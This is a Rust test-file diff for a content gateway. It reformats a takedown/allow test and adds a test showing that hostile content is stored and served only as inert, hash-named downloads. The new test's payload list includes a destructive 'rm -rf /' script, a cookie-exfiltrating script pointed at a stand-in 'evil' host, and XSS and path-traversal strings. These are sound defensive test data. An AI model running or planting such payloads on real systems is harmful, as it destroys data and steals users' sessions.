@@ -184,29 +184,172 @@ async fn takedown_api_removes_content_and_blocks_redownload() {
     let client = reqwest::Client::new();
 
     // served before takedown
-    assert_eq!(client.get(format!("{gw}/content/0x{h}")).send().await.unwrap().status(), 200);
+    assert_eq!(
+        client
+            .get(format!("{gw}/content/0x{h}"))
+            .send()
+            .await
+            .unwrap()
+            .status(),
+        200
+    );
 
     // DELETE without the token is REFUSED (content stays up)
-    let no_auth = client.delete(format!("{gw}/content/0x{h}")).send().await.unwrap();
+    let no_auth = client
+        .delete(format!("{gw}/content/0x{h}"))
+        .send()
+        .await
+        .unwrap();
     assert_eq!(no_auth.status(), 403);
-    assert_eq!(client.get(format!("{gw}/content/0x{h}")).send().await.unwrap().status(), 200);
+    assert_eq!(
+        client
+            .get(format!("{gw}/content/0x{h}"))
+            .send()
+            .await
+            .unwrap()
+            .status(),
+        200
+    );
 
     // DELETE WITH the token → purged + denied
-    let del = client.delete(format!("{gw}/content/0x{h}")).bearer_auth("s3cret").send().await.unwrap();
+    let del = client
+        .delete(format!("{gw}/content/0x{h}"))
+        .bearer_auth("s3cret")
+        .send()
+        .await
+        .unwrap();
     assert_eq!(del.status(), 200);
 
     // now GONE on the gateway…
-    assert_eq!(client.get(format!("{gw}/content/0x{h}")).send().await.unwrap().status(), 410);
-    assert_eq!(client.head(format!("{gw}/content/0x{h}")).send().await.unwrap().status(), 410);
+    assert_eq!(
+        client
+            .get(format!("{gw}/content/0x{h}"))
+            .send()
+            .await
+            .unwrap()
+            .status(),
+        410
+    );
+    assert_eq!(
+        client
+            .head(format!("{gw}/content/0x{h}"))
+            .send()
+            .await
+            .unwrap()
+            .status(),
+        410
+    );
     // …and the store refuses to re-store it (so the ingest loop can't bring it back)
     assert!(store.is_denied(&h).await);
     assert!(store.put(&h, GOOD).await.is_err());
     assert!(store.has(&h).await.is_none());
 
     // allow it back (admin) → store can hold it again
-    let allow = client.post(format!("{gw}/admin/allow/0x{h}")).bearer_auth("s3cret").send().await.unwrap();
+    let allow = client
+        .post(format!("{gw}/admin/allow/0x{h}"))
+        .bearer_auth("s3cret")
+        .send()
+        .await
+        .unwrap();
     assert_eq!(allow.status(), 200);
     assert!(!store.is_denied(&h).await);
     store.put(&h, GOOD).await.unwrap();
-    assert_eq!(client.get(format!("{gw}/content/0x{h}")).send().await.unwrap().status(), 200);
+    assert_eq!(
+        client
+            .get(format!("{gw}/content/0x{h}"))
+            .send()
+            .await
+            .unwrap()
+            .status(),
+        200
+    );
+}
+
+#[tokio::test]
+async fn adversarial_content_is_inert_opaque_bytes() {
+    // Non-self-fulfilling proof that hostile CONTENT cannot trigger anything on a node: whatever the
+    // bytes are (a script, HTML/JS, an executable, path-traversal text, a compression-bomb header,
+    // control/format chars), the node only ever (a) stores them byte-identical under <sha256>.bin —
+    // the content NEVER influences the filename — and (b) serves them as a non-renderable download.
+    let dir = tempfile::tempdir().unwrap();
+    let store = Store::open(dir.path()).await.unwrap();
+    let payloads: Vec<&[u8]> = vec![
+        b"#!/bin/sh\nrm -rf / --no-preserve-root\n", // a shell script
+        b"\x7fELF\x02\x01\x01\x00 malicious binary", // ELF magic
+        b"<html><script>fetch('//evil/'+document.cookie)</script></html>", // HTML+JS
+        b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>", // SVG+JS
+        b"../../../../etc/passwd",                   // traversal as CONTENT
+        b"..\\..\\windows\\system32",                // windows traversal
+        b"\x1f\x8b\x08\x00 gzip-bomb-header",        // gzip magic (must NOT be decompressed)
+        b"%s%s%s%n%x  format string",                // format-string chars
+        b"\x00\x00 null bytes \x00 and \x07 bells \x1b[2J", // null + control/ANSI
+        b"{\"a\":{\"a\":{\"a\":{\"a\":\"deep\"}}}}", // nested JSON (must NOT be parsed)
+        b"javascript:alert(1)",                      // js: scheme as content
+    ];
+    let before: std::collections::HashSet<_> = std::fs::read_dir(dir.path())
+        .unwrap()
+        .filter_map(|e| e.ok())
+        .map(|e| e.file_name())
+        .collect();
+
+    let gw = spawn(router(GwState {
+        store: store.clone(),
+        max_bytes: 1 << 20,
+        admin_token: None,
+        conns: std::sync::Arc::new(tokio::sync::Semaphore::new(64)),
+    }))
+    .await;
+    let client = reqwest::Client::new();
+
+    for p in &payloads {
+        let h = sha256_hex(p);
+        store.put(&h, p).await.unwrap();
+        // stored byte-identical, addressed ONLY by its hash
+        assert_eq!(
+            store.get(&h).await.unwrap(),
+            *p,
+            "content must round-trip byte-identical"
+        );
+
+        // served as an inert download — never an executable/renderable type
+        let r = client
+            .get(format!("{gw}/content/0x{h}"))
+            .send()
+            .await
+            .unwrap();
+        assert_eq!(r.status(), 200);
+        let hd = r.headers();
+        assert_eq!(
+            hd.get("content-type").unwrap(),
+            "application/json; charset=utf-8"
+        );
+        assert_eq!(hd.get("x-content-type-options").unwrap(), "nosniff");
+        assert_eq!(hd.get("content-disposition").unwrap(), "attachment");
+        assert!(hd
+            .get("content-security-policy")
+            .unwrap()
+            .to_str()
+            .unwrap()
+            .contains("default-src 'none'"));
+        // the served body is the exact bytes (no transformation/decompression/escaping)
+        assert_eq!(r.bytes().await.unwrap().as_ref(), *p);
+    }
+
+    // CRITICAL: the only files the content created are <64-hex>.bin — no script, no traversal escape,
+    // no path the content's bytes chose. (Plus whatever existed before, e.g. none.)
+    for e in std::fs::read_dir(dir.path())
+        .unwrap()
+        .filter_map(|e| e.ok())
+    {
+        let name = e.file_name();
+        if before.contains(&name) {
+            continue;
+        }
+        let n = name.to_string_lossy();
+        let stem = n.strip_suffix(".bin").unwrap_or(&n);
+        assert!(
+            n.ends_with(".bin") && stem.len() == 64 && stem.chars().all(|c| c.is_ascii_hexdigit()),
+            "content must only ever create <hash>.bin files, found: {n}"
+        );
+    }
 }
